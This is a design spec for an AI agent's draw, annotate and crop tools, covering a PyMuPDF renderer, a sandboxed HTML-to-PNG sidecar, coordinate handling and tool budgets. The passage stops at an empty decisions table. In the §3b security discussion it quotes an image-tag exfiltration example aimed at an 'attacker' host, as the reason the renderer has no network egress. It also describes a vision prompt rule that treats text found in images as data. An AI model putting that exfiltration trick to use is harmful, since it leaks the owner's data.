# Agent Canvas — Draw, Annotate, Crop — Design Spec

> **Status:** In progress · **Last verified:** 2026-08-16 · **Waves:** W0✅ W1✅ W1b✅ W2✅ W3✅ W4✅ W5✅ W6◻️ · **§10 decisions 1–6 ratified by the owner 2026-08-16**

> **W0–W3 landed on-branch.** W0's *code* is complete (the `--image-min-tokens`
> floor, `agent/grounding.py`, the EXIF fix, `POST /api/debug/grounding`); its
> **measurement is still owed** — the coordinate base is pinned as `AUTO` (inferred per
> response) until the probe is run on the box and the result recorded here. W1b added a
> capability the plan did not originally scope: a general-purpose HTML→PNG renderer
> (§3b), which is now the sanctioned path for any tool wanting rich visual output.
> W2/W3 shipped the `canvas` + `show_canvas` pair, the model gate, and the engine
> ceilings. W4 shipped `crop_regions` and the `image_set` card after the owner cleared
> the three-mock gate (§10.7, variant B).
>
> **One item deferred out of W4, deliberately.** §6.4 proposed serving crops through a
> scope-validating route so a crop of a health-scoped photo could not be read by id from
> another domain. Crops instead persist through `persist_chat_image` like every other
> chat image, which means they inherit the SAME firewall step-down `grab_frame` and
> `compare_images` already have: `generated_images` is owner-only with no domain column
> (migration 0078). This is not a new hole, and fixing it for crops alone would be
> inconsistent — the right scope is a `domain_code` on `generated_images` covering every
> provenanced chat image at once. Tracked as W6 work, not silently dropped.

> Reconciled with the root `CLAUDE.md` non-negotiables — the `look` vision call goes
> through the LLM adapter (rule 1), every rendered PNG through the storage
> abstraction (rule 2), scene state on an RLS-scoped session with the domain stamp
> the source photo carries (rule 3), **zero new runtime dependencies** (PyMuPDF and
> Pillow are already pinned), and the W0 probe is **debug-API-operable, never a
> shell script** (rule 10 — the owner runs the box with no terminal).

> Sibling to `VIDEO_IMAGE_TOOLS_PLAN.md`, which owns *seeing* an image
> (`grab_frame`, `fetch_image`, `compare_images`). This plan owns *marking up and
> cutting up* an image. The two share `generated_images`, the `provenance` column
> (migration 0139), and `chat_images.resolve_source`; neither duplicates the other.

Give jerv a **canvas it draws on by tool call** — to put a labelled box around a
thing in the owner's photo, to cut individual regions out of it as their own
images, and (experimentally) to sketch a figure on a blank sheet.

---

## 1. Why — the three asks, and what the evidence says about each

The owner's ask, in their words: *"provide it an image and be like hey put a red box
around"*, *"export individual images of faces"*, and *"drawing characters on a blank
canvas … I understand that maybe the drawing ability might not be the best thing for
this model to do. but I want to experiment with it."*

Those are **three lanes with three different risk profiles**, and the plan is honest
about the split rather than pretending they're one feature:

| Lane | Ask | Evidence | Verdict |
|---|---|---|---|
| **L1 Annotate** | box + callout on an uploaded photo | Qwen3.8-27B: OSWorld-Verified **84.3** (up from 63.9 on 3.6), AndroidWorld **81.9**, CharXiv **90.2** | **The load-bearing lane.** Ship first, ship well. |
| **L3 Crop/export** | "export individual images of each face" | VLM multi-instance recall collapses on small objects (≤7.1% recall on small; 32.2%/39.7% medium/large); counting fails at the symbolic-mapping stage and **undercounts silently** | **Works for few/large regions. Needs a real detector for faces.** |
| **L2 Blank canvas** | draw a character, sketch a diagram | SketchAgent (on Claude 3.5): figures come out *"too abstract and unrecognizable"*; the one public head-to-head scored a 32B open model **0.25/5** on fine-grained draw tools | **Experimental by explicit owner decision.** Built, boxed, not optimised. |

The reason L1 is now worth building — and this is what changed the assessment —
is `qwen3.8-27b` (`llm/local_catalog.py:336`, dense 27B, `mmproj-F16.gguf`,
`supports_vision=True`). OSWorld-Verified measures clicking precise pixel targets in
real desktop GUIs; **84.3 is not a model that coin-flips on coordinates.** Earlier
scoping assumed Qwen3-VL's ScreenSpot-Pro ~54%, which this checkpoint supersedes.

**A fourth thing fell out of the design and is bigger than the canvas** (§3b): the
box now has a general-purpose **HTML → PNG renderer**. Rendering model-authored markup
server-side to pixels is what makes it *safe* — the PWA receives an image, never live
DOM — which turns `DESIGN.md`'s refusal of model-authored markup from a constraint to
work around into a boundary the design respects. The canvas is its first caller, not
its owner; a later flowchart, comparison-table, or report-card tool renders through the
same service.

**What we are NOT building** (§9 carries the full list): a plotting op set —
`render_chart`/`render_bars` already draw a real interactive chart and would compete
for the same trigger words; generative edit of the photo — `edit_image` recreates the
image rather than compositing, so the source pixels must never round-trip through it.

---

## 2. What we build

Three tools, one renderer, one scene model.

- **`canvas`** — open a canvas (blank, or on top of an attachment/generated image),
  apply a **batch of flat ops** against an id-addressed scene, optionally `look` at
  it through the vision model. Serves L1 and L2.
- **`show_canvas`** — render the scene and show the owner one image card. Serves L1
  and L2.
- **`crop_regions`** — cut N regions out of a source image and return them as one
  gallery card of N saveable images. Serves L3.

Plus a pure `jbrain/draw/` package (scene + renderer, no DB, no LLM, no network) and
a pure `agent/grounding.py` (coordinate conversion, keyed on the served model).

---

## 3. The rendering backend — PyMuPDF, and why it isn't Pillow

**There is no server-side renderer in this codebase to extend.** `agent/charttools.py`
rasterizes nothing — it emits a data-only `ViewPayload(view="chart")` and the React
component draws it. `image_gen/render.py` is the ComfyUI diffusion driver. So the
question was only *which already-pinned dependency to repurpose*, and the answer is
not the obvious one.

`backend/pyproject.toml` pins exactly two imaging libraries: **Pillow ≥10.4** and
**PyMuPDF ≥1.24** (resolved 1.27.2). No matplotlib, no cairo, no skia, no numpy.

**PyMuPDF wins on four measured counts** (verified in the venv during scoping):

| | PyMuPDF | Pillow `ImageDraw` |
|---|---|---|
| Antialiasing | Full, vector | **None on diagonals** — needs 2–4× supersampling |
| Fonts in `python:3.12-slim` | **Bundled, incl. CJK** (`pymupdf.Font("cjk")` → Droid Sans Fallback) | Bundled Aileron only — **tofus on `—` and CJK** |
| Text measurement | `get_text_length()`, `insert_textbox()` returns overflow | `getbbox()` only; wrap by hand |
| Composite a photo | `insert_image(rect, stream=…)` | `paste()` |

The font point is decisive and is the trap this plan exists partly to avoid:
**`backend/Dockerfile` is `python:3.12-slim` and installs only `ffmpeg` — there are no
system fonts.** A naive `ImageFont.truetype("DejaVuSans.ttf")` passes on a dev box and
fails in production. Every SVG-rasterizer option (cairosvg, resvg, skia) dies on the
same rock. PyMuPDF's bundled fonts sidestep it entirely, with **no Dockerfile change
and no `dev-setup.sh` change** (non-negotiable #8 satisfied by having nothing to add).

**What we give up:** the scene is built on a PDF page, so coordinates are PDF points
and a 1pt-per-px page must be fixed once in a `_page_for(width, height)` helper. This
is a genuine conceptual mismatch and the helper's docstring must say *why* it exists.
Base-14 `helv` also mis-encodes `—` under WinAnsi, so **every owner-visible string
goes through `pymupdf.Font("cjk")` / `TextWriter`**, never the simple `insert_text`
path. Pillow stays for the pixel-level work it already does (`sniff_image_media_type`,
`image_dimensions`, `stitch_side_by_side`, `downscale_for_vision`) and for
`Image.crop()` in L3.

---

## 3b. The `htmlrender` service — a general capability, not a canvas detail

Owner decision (§10.6). The shape ops are worst at exactly what HTML is best at —
wrapped multi-line text, lists, small tables, styled labels — and the representation
evidence is one-sided: higher-level formats beat low-level primitives by ~17 points on
the same models (VGBench), drawing competence tracks *coding* competence, and this
model's headline gains are coding gains (Terminal-Bench 73.0, DeepSWE 42.2, Vision2Web
62.9). Handing it a language it is genuinely fluent in beats a nine-op vocabulary it
meets for the first time in a sidecar.

**Rendering to pixels is the security argument, not a workaround for it.** `DESIGN.md`
keeps a closed view registry and bars model-authored markup, URLs and colour from
reaching the DOM. A server-side raster satisfies that completely: the model gets full
CSS, and the PWA receives an image. An image cannot execute. This is why the service
is worth building beyond the canvas — any later tool wanting a flowchart or a report
card gets a sanctioned path instead of a reason to argue with the design system.

**Shape.** A stock-stack sidecar (`deploy/htmlrender/`, Playwright + Chromium) exposing
`POST /render {html,width,height,transparent}` → PNG. `jbrain/htmlrender.py` is the
pinned client (base URL from config, never model-supplied), mirroring
`vision/rapidocr.py`. Reached only by the api.

**Two properties that must not be undone:**

1. **Egress-free, twice.** The compose service sits on a network declared
   `internal: true`, so the container has no route off the box at all, and the page
   also aborts every non-`data:` request itself. The markup is untrusted input and
   `<img src="http://attacker/?d=…">` is the obvious exfiltration primitive; neither
   lock alone is worth betting owner data on.
2. **It never receives owner images.** Blocks render TRANSPARENT at their own size and
   `draw/compose.py` composites them over the photograph inside the firewall. A
   health-scoped photo therefore never reaches a browser container, and the payload
   stays small.

**Rejected alternative: PyMuPDF `Story`.** Zero dependencies and it does render an
HTML subset — verified working for background colour, font sizing, bold, lists, tables,
em-dash and CJK. But it is a flow-layout engine, not a browser: flexbox is ignored and
content overlaps, `border-radius` and `letter-spacing` are dropped, `position:absolute`
lands wrong. A model writing ordinary CSS gets a *silently* mangled result, which is
the worst failure mode available. Kept on the record because it remains the fallback if
the sidecar is ever unavailable.

**Degradation.** An empty `htmlrender_url`, an unreachable sidecar, or a block that
fails to render is reported per-block and the rest of the figure still draws — the same
partial-apply posture as the op fold (§6.1). The canvas never fails wholesale because
one block did.

## 4. The scene model — retained, id-addressed, fractional

A canvas is a background plus an ordered element list, re-rendered whole on every
call. **Not** a mutable bitmap.

```python
{
  "v": 1,
  "background": {"kind": "attachment", "attachment_id": "<uuid>",
                 "width": 4032, "height": 3024},   # EXIF-CORRECTED — see §5
  "elements": [
    {"id": "e1", "z": 0, "type": "rect",
     "at": {"x1": 0.312, "y1": 0.508, "x2": 0.447, "y2": 0.622},
     "style": {"tone": "danger", "weight": "bold", "fill": "tint"},
     "origin": {"src": "vlm"}},
    {"id": "e2", "z": 1, "type": "callout",
     "at": {"x": 0.10, "y": 0.82, "points_to": [0.40, 0.60]},
     "text": "drain valve leaking here",
     "style": {"tone": "danger", "size": "body"}}
  ]
}
```

Three decisions embedded here, each load-bearing:

**4.1 Retained, not immediate.** Editing by id is what makes "move that box left"
work. This is not a preference — SVGEditBench V2 found that on instruction-based
editing **most models score worse than not editing at all**, because regenerating
geometry as text drifts. `{op:"move", id:"e4", dx:-40}` never touches geometry the
model has to re-derive. An append-only pixel canvas would need a full redraw for the
same capability *and* would still have to keep the list.

**4.2 Fractional coordinates (0–1), not pixels.** They survive a background swap and
a re-render at a different DPI, and they are one division away from the model's native
grounding output. Pixels appear only inside the renderer.

**4.3 Semantic `tone`, never colour.** `DESIGN.md:1204` is binding: components
*"express `tone`/`flag`/`kind` enums, **never colors or hex**"*. So "put a **red** box"
records as `tone: "danger"` and the renderer resolves it to `--rose #CF8A8F`.

> **Deliberate deviation, to be written into `DESIGN.md` in the W3 PR.** `--rose` on a
> busy photograph has poor contrast. The annotation layer keeps the *hue* (so it reads
> as JBrain's danger tone) but adds a legibility affordance the UI chrome doesn't
> need: a dark 1px outer stroke under every accent stroke, and a `--surface`-tinted
> backing plate at ~85% opacity behind label text. Without this, half the annotations
> are invisible on a real photo.

`origin` (`vlm` | `ocr` | `detector` | `owner`) is stamped per element because when a
box lands wrong, provenance of the coordinate is the first thing anyone wants.

---

## 5. Coordinates — the part that silently breaks

**5.1 The convention is a per-model fact, and 3.8's is undocumented.** Qwen has
changed it once already: Qwen2.5-VL emitted **absolute pixels in the resized input**;
Qwen3-VL emits **normalized `bbox_2d` against the original image**. Worse, the
Qwen3-VL docs contradict themselves — the cookbook and most sources say `[0,1000]`,
the docs site says `0–1` relative. The `Qwen/Qwen3.8-27B` model card documents
**no** grounding format at all: no bbox section, no RefCOCO, no ScreenSpot.

Therefore: **W0 measures it on the box and pins it.** All conversion lives in one
pure module, `agent/grounding.py` (modelled on `agent/chartscale.py` — dependency-free,
unit-testable with no Postgres and no LLM):

```python
def denormalize(boxes, *, served_model: str, width: int, height: int) -> list[PixelBox]
```

It takes the **served model name** so the convention is selected, not assumed, and it
**refuses rather than guesses** on an unknown model. Scattering `/1000 * width` at call
sites is exactly how the two conventions get mixed; the module exists to make that
impossible.

**5.2 The EXIF bug, which is already latent.** `ingest/imageprep.downscale_for_vision`
calls `ImageOps.exif_transpose` before measuring; `agent/chat_images.image_dimensions()`
reads `img.width/height` from the header **without** transposing. Take the original
dimensions from the untransposed row while the model saw a rotated frame and **every
box is transposed 90°**. This is the single highest-probability real bug in the
feature. Fix in W1: dimensions must come from the same `exif_transpose`'d image the
model was handed, and the rotation is baked into the stored bytes.

**5.3 Per-axis, never uniform.** Normalization is independent per axis. A portrait
phone photo is the case where uniform scaling by the long side looks *nearly* right
and drifts — the failure reported against Qwen3-VL for far-from-square aspect ratios.

**5.4 Serving prerequisite.** `llm/llama_swap_config.py:157-159` passes `--mmproj` but
**neither `--image-min-tokens` nor `--image-max-tokens`.** Ecosystem consensus is that
Qwen-VL needs `--image-min-tokens 1024` for grounding to work at all; below it, a
low-resolution photo gets too few image tokens and grounding degrades to guessing.
This is a per-entry `extra_server_args` change on the vision catalog rows, and it
gates the whole feature.

**5.5 Take the box from a detector when one exists.** For a *text* target the repo
already has ground truth: RapidOCR returns `{text, box, score}` per line
(`vision/rapidocr.py:31-40`). "Circle the part number" should never be a guess.

---

## 6. The tool surface — three tools, and the anti-bloat argument

**The budget is real and tighter than the existing catalog plan assumed.** jerv holds
**41 tools ≈ 103KB of sidecars ≈ 26–29.5k tokens**, sent on every ReAct step.
`docs/proposed/TOOL_CATALOG_PLAN.md` §1 measured this against gpt-oss-120b's 128k and
called it 18–20% of the window — but **`qwen3.8-27b` serves at the catalog default
`-c 32768`** (`local_catalog.py:83`), where the tool block alone is ~80% of the window.
Fifteen drawing primitives would be a budget failure, not a tax. TOOL_CATALOG_PLAN W1
went the other way — a measured 48→37 consolidation collapsing families into `action=`
umbrellas with *no measurable tool-selection regression*. **This plan follows that
precedent: op variety lives inside the batch, never as extra tool names.**

Measured cost of the three sidecars: **~2.3k tokens, +8% on jerv's block** — less than
`web_fetch` (7.5KB) alone.

### 6.1 `canvas` — one flat op object, no `enum`, no `oneOf`

**A schema landmine, already bisected in-tree.** gpt-oss's harmony path (llama.cpp
`--jinja`) builds a GBNF grammar over the tool union, and **an `enum` on a property of
a many-optional-property object deterministically segfaults the upstream** — documented
at `agent/tools/analyze_stream.tool:5-12` and reproducible via `/api/debug/tool-probe`
(`api/debug.py:347`). A textbook discriminated-union `op` enum is exactly that shape.

So every op is one flat object — `{op, x, y, x2, y2, w, h, text, tone, size, width,
fill, id, dx, dy}`, only `op` required — with allowed values in the `op` field's
*description* and validated in the handler.

**Op vocabulary (10, deliberately high-level):** `text`, `line`, `arrow`, `rect`,
`callout`, `label_box`, `html`, `delete`, `move`, `clear`.

`html` (§3b) places a browser-rendered block at a rect. It is an **op, not a fourth
tool**, for two reasons: the surface stays at three names, and a rendered block stays
an *element* — movable and deletable by id like any other mark, because the op owns the
rect while the markup only fills it. That preserves edit-by-id, which is the one thing
a raw HTML document would have cost (§4.1).

`callout` (bubble + leader line to a target point) and `label_box` (box + caption) are
the two composite primitives that do the actual work of L1 — each is one op instead of
four, and the model never computes a leader line, a bubble outline, or an arrowhead
polygon. **The server owns all geometry and text metrics.** This is the single
highest-leverage usability decision in the design, and it is what the prior art
converged on independently: tldraw's official MCP app ships **3 tools**, and the
layout-engine argument is stated plainly in the wild — *"When LLMs try to generate
Excalidraw directly, they hallucinate coordinates — boxes overlap, arrows tangle."*

**Error policy: partial-apply with a per-op report.** A 20-op figure with one typo must
not lose 19 good ops on a model running ~7 t/s. Malformed ops are skipped, not fatal,
and because the scene is addressable the model just re-sends the one op. Out-of-bounds
coordinates are **clamped and the clamp reported**, never silently drawn off-screen.

Result text is compact (~60 tokens) and carries the full mark list, so editing-by-id
needs no separate `list` op:

```
canvas cv1 · 1024x768 on attachment "heater.jpg" · 9 marks
applied 5 of 6 → e5 label_box, e6 callout, e7 text, e8 arrow, e9 rect
op 3 (arrow) skipped: x2=1400 outside width 1024 — clamped to 1024
marks: e1 rect(60,140 240x110) e2 text(90,180 "Laptop") …
nothing has been shown to the owner yet — call show_canvas when the figure is right
```

### 6.2 The `look` field — not a tool, and not automatic

**A tool result cannot carry an image into the agent's own context.**
`llm/types.py:148-156` — `ToolResult.content` is a `str`, and both the OpenAI-compat
path (`openai_compat.py:98-102`) and the Anthropic path serialize it as a string.
Images ride only a `UserMessage`. Injecting a synthetic image-bearing user message
mid-loop is possible (the loop already injects directives at `loop.py:756,782`) but
would re-pay 256–1280 visual tokens on **every subsequent ReAct step of that turn** —
unusable on a 32k window at ~7 t/s. **That work is explicitly out of scope** (§9); it
belongs to `CROSS_TURN_TOOL_RESULTS_PLAN.md`'s territory if it is ever wanted.

So `look` runs a **separate `agent.vision` completion and returns text**, reusing
`analyze_image`'s exact path: `chat_images.vision_read_spec(router, ctx.model_override)`
(`chat_images.py:55-68`, which reuses the conversation's own vision-capable pick to
avoid a residency swap on the memory-bound box) plus the `_VISION_SYSTEM` framing that
treats text in an image as content to report, never as instructions. The image cost
lands on the vision model's context; the agent pays only the returned text, capped at
~400 chars.

**Explicit-only, never auto after each batch.** With a retained scene the model already
knows what it drew — the state summary is authoritative and free. A look earns its cost
in exactly two places: aiming at a photo before annotating it, and one final check.

**Convergence policy, engine-enforced.** `MODEL_PROMPTING.md`'s rule is *prompt =
intent, engine = ceiling*, and a `/chat` turn is supervised with
`SUPERVISED_MAX_STEPS = 500` (`loop.py:151`) — nothing else would stop a 40-call
fiddle loop. A `canvas_budget: ToolCallBudget` on `ToolContext` (mirroring the existing
`search_budget`/`fetch_budget`, `loop.py:306`) enforces:

- **3 looks per canvas per turn.** Fourth → refused with "draw what you have or call
  `show_canvas`".
- **10 `canvas` calls per turn.** Past it the handler refuses and instructs
  `show_canvas`.
- Remaining counts appended to every result, the pattern the scout already uses.

Target shape: blank → one batch → show (2 calls); photo → look to aim → one batch →
show (3 calls). The **ceiling sits deliberately well above the target** (owner
decision, §10.4): it buys a full aim → draw → check → fix → check cycle for the
experimental blank-canvas lane, where the model genuinely cannot predict what it drew
and the target shape does not apply. The ceiling still lands at the point where repair
rounds **saturate, with some samples degrading**, and it exists at all because
intrinsic self-correction without external feedback *degrades* performance. A render
is genuine external feedback, so the loop works — but the judge is the same model, so
it must be budgeted, not trusted. W6 tunes the numbers against measured latency.

**The `look` question must be concrete and answerable** ("does the red box contain the
water heater?"), never "does this look good?" — an open aesthetic question is what
produces an unbounded loop, and repetition on dense images is Qwen-VL's documented
failure mode (which is why `local_catalog.py:342` pins `presence_penalty=1.5`).

### 6.3 No grid overlay — reversing an earlier recommendation

Scoping initially called a burned-in coordinate grid *"the highest-value single
decision."* **It is not being built**, for two reasons that emerged later:

1. **The model doesn't need it.** Qwen emits normalized coordinates against the
   original image natively. The grid solves a problem this model doesn't have.
2. **The evidence for marks-on-images transferring to open models is negative.**
   Set-of-Mark, which is the strongest version of this idea, *decreases* LLaVA-family
   performance — including **−16.2% on relational questions** — partly because the
   model must OCR its own overlay labels.

Left as an A/B in W6 if aiming turns out to be the bottleneck. Not built on spec.

### 6.4 `crop_regions` — the L3 lane

Different output contract, therefore its own tool: **N images out, not one.**

**The blocker, and why the naive version doesn't work.** `ToolOutput.view` is a single
slot (`loop.py:335-372`), and persistence is one view per tool call —
`transcript_accumulator.py:90-95` does `step["view"] = …` (last write wins) and
`useFullBrain.ts:200` rehydrates one per step. A handler emitting 12 `ToolViewEvent`s
via `ctx.emit_event` shows **12 cards live and 1 card after reload**. That is a hard
blocker for "each crop is its own saveable artifact."

**The contract that works: one `image_set` view carrying N ids** — the shape
`video_analysis` already uses for frame thumbs (`videotools.py:147-165`,
`DESIGN.md:1256+`):

```
{source: 'attachment'|'image', source_id, label,
 crops: [{image_id, label, confidence?, w, h}], truncated: bool}
```

Each crop is persisted via `persist_chat_image` with a new `provenance="crop"` stamp —
free text, **no migration** (`0139_generated_image_provenance.py:34-39` deliberately
has no CHECK) — so crops resolve by id for `analyze_image`/`edit_image` yet stay out of
the owner's image gallery, which already filters `provenance IS NULL`
(`models/images.py:93-105`).

**Cap: `MAX_CROPS_PER_CALL = 12`**, truncate-with-note rather than error (the
`MAX_PDF_PAGES` posture). It sits between `MAX_COMPARE_IMAGES` (6) and
`MAX_IMAGES_PER_TURN` (20), fills a 2-col masonry with 6 rows, and covers a realistic
group photo. **Note there is no blob GC anywhere** — `BlobStore` has no delete and
`GeneratedImageRepo.delete` deliberately leaves the blob — so crops are permanent.
Bounded but monotonic.

**A firewall step-down that must not be waved through.** Chat attachments are
domain-stamped (`agent/attachments.py:89-107`); `generated_images` is **owner-only with
no domain column** (`0078_generated_images.py:22-51`). Cropping a photo attached in a
health-scoped session would produce rows readable by id from a finance-scoped session.
`grab_frame` and `compare_images` already do this, but **faces make the blast radius
qualitatively different from a video still.** So crops of a domain-stamped attachment
are served through a **scope-validating route** that checks the id under the
attachment's own scope — mirroring `TurnAttachmentRepo.frame_thumb`
(`attachments.py:214-229`, designed at `DESIGN.md:1285-1298`) — not by raw id through
the un-domained table. This keeps invariant #3 intact and adds no new table.

### 6.5 Faces need a detector, not a VLM

The owner's example — "export individual images of faces" — is the **worst case** for
VLM grounding, and the failure is silent: you get 6 crops from a 14-person photo and no
error. Evidence: recall on small objects does not exceed **7.1%**, with the strongest
tested model reaching only 32.2%/39.7% on medium/large; dense-detection localization is
loose (**76.9 F1@0.5 but 5.3 F1@0.95** — fine for pointing, fatal for cropping, where a
loose box takes half a neighbour's face); and the counting bottleneck sits at the
symbolic-mapping stage, so "a box for *each* of the 14" degrades to 6, or to 14 with 4
duplicates.

**The cheap fix, with zero new backend dependencies.** The RapidOCR sidecar image
already pins the full classical CV stack — `deploy/Dockerfile.rapidocr:18-25` has
`opencv-python-headless==4.11.0.86`, `onnxruntime`, `numpy`. OpenCV ships **YuNet**
(a ~340KB ONNX face detector) as `cv2.FaceDetectorYN`. Adding a `/detect/faces` route
to `deploy/rapidocr/server.py` reuses the existing lazy-load/idle-unload sidecar: no
new container, no new backend dep, and it honours `PROCESS.md`'s zero-new-dep goal far
better than adding insightface to the backend.

**Detector split, therefore:**

| Target | Source of boxes |
|---|---|
| Faces | **YuNet** via the rapidocr sidecar (W5) |
| Text / labels | **RapidOCR** line boxes — already on-box, deterministic |
| Open-vocabulary "crop each X" | Qwen grounding, **with the found count stated in the result** so an undercount is visible rather than silent |

Until W5 lands, `crop_regions` on faces uses Qwen grounding and the sidecar prose says
plainly that it may miss people in a crowded photo.

---

## 7. Gating to the vision model — nearly free

Canvas tools are useless on a text-only pick. `qwen3.8-27b-mtp` is
`supports_vision=False` (`local_catalog.py:407-416` — llama.cpp's MTP path can't run
alongside `--mmproj`), and `api/agent.py:811-817` silently drops image bytes for a
text-only model. Without gating, the owner on the fast MTP variant would get blind
drawing with no signal.

**The mechanism already exists and needs no signature change.** `hidden_tools_provider`
(`loop.py:521`) is the one dynamic per-turn tool-visibility hook, and it is composed
**per turn** at `api/agent.py:755-759`, in the same function where the resolved model is
already in scope (`model_override`; `router.supports_vision(...)` at `:781`;
`router.effective_spec(...)` at `:792`). Hiding the canvas tools is a closure in that
block that unions `CANVAS_TOOL_NAMES` when the resolved served model isn't allowlisted.
`can_see_images` at `:781` is almost the gate already — it just needs to move above
`:755`.

**Gate on vision-capable AND a served-model allowlist**, not on `supports_vision`
alone. A bare vision gate would expose the tools to cloud multimodal models whose
coordinate convention differs — which is precisely how boxes land silently skewed. An
allowlist extended deliberately as each model is qualified makes "which models can
draw" a readable list rather than emergent behaviour.

**The one gotcha:** `priming.py:44-65` builds the warm-up prefix from the same
allowlist + hidden set and asserts no drift. It must receive the same composed
provider, or the warm-up prefix diverges from the turn's tool block and KV-prefix reuse
is lost. (Switching models already forces a fresh prefill, so the tool block changing
alongside a model switch costs nothing — the KV concern applies only to arming tools
*mid-conversation*, which this design never does.)

---

## 8. Waves

Per `PROCESS.md`: parallel tasks per wave, independent adversarial review per task and
per wave, exactly one PR per wave, CI green before merge.

### W0 — Grounding probe + serving prerequisites *(ships first, gates everything)*
- `--image-min-tokens 1024` (and `--image-max-tokens`) as `extra_server_args` on the
  vision catalog entries (§5.4).
- Verify Unsloth's `chat_template.jinja` against **the template trap**: Qwen3.8's
  official template wraps each assistant turn in a think block *even when reasoning is
  empty*, then opens another at generation — these **nest and truncate history** across
  turns. Several GGUF packs ship a corrected template. Silently losing conversation
  history would present as a JBrain bug, not a template bug.
- `agent/grounding.py` — pure, served-model-keyed, refuses on unknown (§5.1).
- A fixture set of images with known boxes + a **debug-API route** to run the probe
  (`POST /api/debug/grounding`), **not a shell script** — CLAUDE.md rule 10.
- **Exit:** the convention (`0–1` vs `0–1000`) is measured on the live box, pinned in
  `grounding.py`, and the hit rate recorded in the PR.

### W1b — The `htmlrender` service *(§3b; runs with W1)*
- `deploy/Dockerfile.htmlrender` + `deploy/htmlrender/server.py` (Playwright/Chromium,
  lazy launch + idle unload on the `rapidocr` pattern), the compose service, and the
  `render` network declared `internal: true`.
- `jbrain/htmlrender.py` — the pinned client; `settings.htmlrender_url`; wired on
  `app.state` beside `rapidocr` so any later tool can reach it.
- `jbrain/draw/compose.py` — the one module in `draw` that touches the network: renders
  each `html` block transparent and composites inside the firewall.
- `scripts/dev-setup.sh` pre-pulls the Chromium base image (rule 8).

### W1 — The renderer, pure and offline
- `jbrain/draw/scene.py` — scene model, op validation, the fold, partial-apply
  reporting. `jbrain/draw/render.py` — PyMuPDF: marks, halos, arrowheads, callout
  bubbles, tone→palette resolution, the legibility affordance (§4.3).
- The **EXIF fix** (§5.2): `image_dimensions()` transposes, dimensions come from the
  same image the model was handed.
- No DB, no LLM, no network — plain unit tests, trivially coverable to 100%.

### W2 — The `canvas` tool
- Handler in `agent/drawtools.py`; the `canvas.tool` sidecar (§6.1).
- Scene persisted via the existing `ToolArtifactRepo` (`tool_artifacts.py`) —
  session-scoped, RLS-firewalled, blob-backed, **already domain-stamped by
  `domain_for_session`** (`tool_artifacts.py:32-44`), with upsert-on-`source_url`
  semantics that are exactly "save this canvas". **No migration, no new RLS policy**
  (still add an isolation test asserting a foreign session can't read a canvas —
  testing existing policy, not writing new).
- Source images via the existing `chat_images.resolve_source`.
- `look` via `agent.vision` + `vision_read_spec`; `canvas_budget` on `ToolContext`.
- Cross-turn reference line via the existing `_tool_artifact_blocks` pattern
  (`api/agent.py:417`) so "move the arrow left" works in the *next* turn.
- Model gating per §7.

### W3 — `show_canvas` + wiring
- `persist_chat_image(provenance="canvas")` → the **existing** `generated_image` card.
  No new component, no frontend work beyond a `provenance` label branch
  (`registry.tsx:710-717`).
- Add both names to `JERV_TOOLS`; add the reciprocal routing line to `generate_image`'s
  body (a model-facing prose change → deliberate `version` bump per the digest guard).
- `DESIGN.md` updated in this PR with the §4.3 deviation.
- **Gate:** run `/api/debug/tool-probe` with the new schemas against the actually-served
  model and record the numbers in the PR — the same validation TOOL_CATALOG_PLAN W1
  used, and the only honest way to claim no selection regression.

### W4 — The crop lane *(GUI gate — owner interruption by design)*
- `crop_regions` handler + sidecar; Pillow `Image.crop()`; `provenance="crop"`; cap 12.
- The **scope-validating crop route** (§6.4).
- **New `image_set` registered view.** Per `PROCESS.md`, this requires **three
  interactive mock HTML artifacts presented to the owner before implementation**, the
  chosen mock landing in `docs/mocks/`, plus a new `### image_set tool-view` section in
  `DESIGN.md` in the same PR. Note `DESIGN.md:1213-1216` refuses a generic `image`
  component — this must be a purpose-built named component.
- **No interim fallback** (owner decision, §10.5). The single-region `crop_region`
  variant — N calls → N durable cards today, zero frontend change — was considered and
  **declined**: the lane waits for `image_set` rather than shipping N stacked
  full-width cards and N round-trips on a ~7 t/s model. **W4 is therefore hard-blocked
  on the mock gate.** Run the three mocks *early*, in parallel with W1/W2, rather than
  when W4's backend is ready — see §11.4.

### W5 — Faces via YuNet
- `/detect/faces` on the rapidocr sidecar via `cv2.FaceDetectorYN`, lazy-loaded and
  idle-unloaded on the same schedule as the OCR engine.
- `crop_regions` routes face-shaped targets to it; anything else still grounds through
  the vision model, because a face detector asked for "product labels" would return
  faces.
- **Correction to the scoping memo:** the YuNet ONNX is **not** bundled in the opencv
  wheel — only the `FaceDetectorYN` API is. The ~230KB model is fetched at image build
  time and pinned by sha256. Note the URL: the file lives in Git LFS, so the ordinary
  `raw.githubusercontent` path returns a **131-byte LFS pointer** that loads as a
  confusing runtime error; the checksum turns that into a loud build failure instead.
- If the model is absent the route fails cleanly, `crop_regions` falls back to vision
  grounding **and says so in the result** — degrading quietly would reintroduce exactly
  the silent undercount the detector exists to prevent.
- Still zero new backend dependencies and zero new containers.

### W6 — On-box validation and tuning
- L1 end-to-end on real owner photos; L2 (blank canvas) exercised and honestly
  characterised — this is the **experiment lane**, and "it draws poor characters" is a
  valid, recorded outcome, not a defect to fix.
- Budget tuning (looks, calls, crop cap); the grid-overlay A/B (§6.3) **only if** aiming
  proves to be the bottleneck.

---

## 9. Explicitly not now

- **Plotting ops** (`axes`, `plot_series`) — `render_chart`/`render_bars` draw a real
  interactive Chart/Table/Stats card and already claim the "plot"/"graph"/"chart"
  trigger words in bold. A canvas plot op would be a strictly worse duplicate. If
  *annotating* a chart ever comes up, the answer is a `from_chart` source, not a plot op.
- **Images inside tool results** (the model seeing its own render in-context) — a real
  adapter/loop gap; the `agent.vision` detour is the answer here (§6.2).
- **Mid-turn tool arming** — `TOOL_CATALOG_PLAN` mode (a), explicitly gated there as
  unresolved. The tool array is computed once per turn *before* the step loop
  (`loop.py:951-953`), so tools armed by opening a canvas would only appear on the
  owner's *next* message.
- **A canvas subagent.** Structurally impossible today: `spawn.py:_clamp` computes
  `persona_tools & parent_tools`, so jerv must itself hold the tools for a child to
  hold them — and `schemas_for`/`allowed_names` share one `_admits`, so holding means
  showing. There is no "allowed but not shown" state. Children also return text only.
- `ellipse`, `restyle`, polygons, bezier/freehand, gradients, opacity, layers/z-order,
  groups, rotation; more than one font family; any hex colour.
- An interactive canvas view in the PWA (pan/zoom/edit); SVG/PDF export; a save/share
  button (none exists anywhere in the app today — "save" is a native long-press).
- Canvas on `curator` — jerv only, matching every other media tool.
- Blob GC/retention for crops — pre-existing gap, not this plan's to fix.

---

## 10. Decisions — all five ratified by the owner, 2026-08-16

| # | Decision | Chosen |
|---|---|---|
